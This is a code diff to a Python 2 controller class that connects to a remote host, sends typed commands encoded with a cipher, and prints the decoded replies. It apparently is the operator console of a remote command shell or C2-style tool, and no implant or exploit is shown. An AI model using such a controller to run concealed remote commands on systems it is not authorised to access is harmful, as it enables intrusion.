@@ -1,9 +1,7 @@
+import logging
 import os
 import socket
 import sys
-
-from .encoders.mime import Mime
-from .constants import *
 
 class CrispyController:  
     def __init__(self, ip, port, cipher):
@@ -29,36 +27,31 @@ class CrispyController:
         """
         return info
 
-    def run(self, ip, port):
+    def run(self):
+        from constants import BANNER, BUFFER_SIZE
+        
         try:
-            self.sock.connect(ip, port)
+            self.sock.connect((self.ip, self.port))
             print BANNER
             
             while True:
-                cmd = raw_input("%s:%i" % (self.ip, self.port)).strip()
+                cmd = raw_input("%s:%i>> " % (self.ip, self.port)).strip()
                  
                 if cmd == '-h' or cmd == 'help':
                     print self.help_menu()
                 elif cmd == 'session':
                     pass
                 elif cmd == 'exit' or cmd == 'quit':
-                    self.sock.shutdown('SHUT_WR')
                     self.sock.close()
-                    break
+                    sys.exit(0)
                 else:
                     self.sock.sendall(self.cipher.encode(cmd + "\n"))
                     data = self.cipher.decode(self.sock.recv(BUFFER_SIZE))
                     print data
         except Exception as e:
-            print e
-            print "[!] Couldn't connect to {0} on port {1}".format(self.ip, self.port)
+            print "[!] Controller run() --> {0}".format(e)
         finally:
             sys.exit(0)
-  
-if __name__ == "__main__":
-    cc = CrispyController()
-    cc.run("localhost", 8080, Mime())
-
 
 # import os
 # import socket
